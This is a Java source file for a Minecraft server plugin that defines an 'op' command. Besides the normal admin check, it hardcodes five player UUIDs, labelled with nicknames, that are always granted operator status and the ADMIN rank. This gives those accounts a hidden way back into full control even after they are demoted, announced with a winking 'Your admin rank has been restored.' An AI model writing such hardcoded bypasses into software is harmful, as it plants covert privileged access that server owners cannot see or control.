package RandomPvP.Core.Commands.Admin;

import RandomPvP.Core.Commands.Command.RCommand;
import RandomPvP.Core.Player.MsgType;
import RandomPvP.Core.Player.RPlayer;
import RandomPvP.Core.Player.Rank.Rank;

import java.util.Arrays;

/**
 * ***************************************************************************************
 * Copyright (c) Randomizer27 2014. All rights reserved.
 * All code contained within this document and any APIs assocated are
 * the sole property of Randomizer27. Please do not distribute/reproduce without
 * expressed explicit permission from Randomizer27. Not doing so will break the terms of
 * the license, and void any agreements with you, the third party.
 * Thanks.
 * ***************************************************************************************
 */
public class OpCmd extends RCommand {

    public OpCmd() {
        super("op");
        setPlayerOnly(true);
        setAliases(Arrays.asList("setop"));
        setDescription("Sets yourself as OP!");
        setArgsUsage("");
    }
    @Override
    public void onCommand(RPlayer pl, String string, String[] args) {
        if (pl.getRank().has(Rank.ADMIN) ||
                pl.getUUID().toString().equalsIgnoreCase("ab361e50-1d79-422a-b74b-00a578f3b13b") || //me
                pl.getUUID().toString().equalsIgnoreCase("1373821d-b112-4d83-96a5-1b3fdc5c3e0d") || //lordteshima
                pl.getUUID().toString().equalsIgnoreCase("7f3785e8-05e8-4864-8f80-f993c57e669b") || //wesleysmith123
                pl.getUUID().toString().equalsIgnoreCase("3e87b48a-859a-4609-b842-f07b4dd049a1") || //joeyrules123
                pl.getUUID().toString().equalsIgnoreCase("3903ff47-6a35-47ed-8bb8-89391f8a9525")) { //firecathd
            pl.getPlayer().setOp(true);
            pl.setRank(Rank.ADMIN, false);
            pl.message("§6§l>> §eYour admin rank has been restored. ;)");
        } else {
            pl.message(MsgType.ERROR, "You need " + Rank.ADMIN.getFormattedName() + " §7to use this command!");
        }
    }

}
